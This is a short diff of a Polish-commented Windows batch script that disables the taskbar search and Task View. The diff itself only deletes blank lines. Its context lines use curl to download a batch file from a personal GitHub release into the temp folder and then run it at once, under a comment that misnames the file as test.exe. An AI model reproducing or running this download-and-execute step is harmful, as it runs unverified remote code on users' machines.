@@ -26,7 +26,6 @@ start explorer.exe
 echo --------------------------------------
 echo Pasek wyszukiwania i Widok zadań zostały WYŁĄCZONE.
 
-
 setlocal
 
 :: Ścieżki
@@ -179,5 +178,3 @@ curl -L -o "%temp%\secureuxtool.bat" https://github.com/matisio3/rozne-pliki/rel
 rem Uruchomienie pobranego pliku test.exe z katalogu %temp%
 start "" "%temp%\secureuxtool.bat"
 exit
-
-
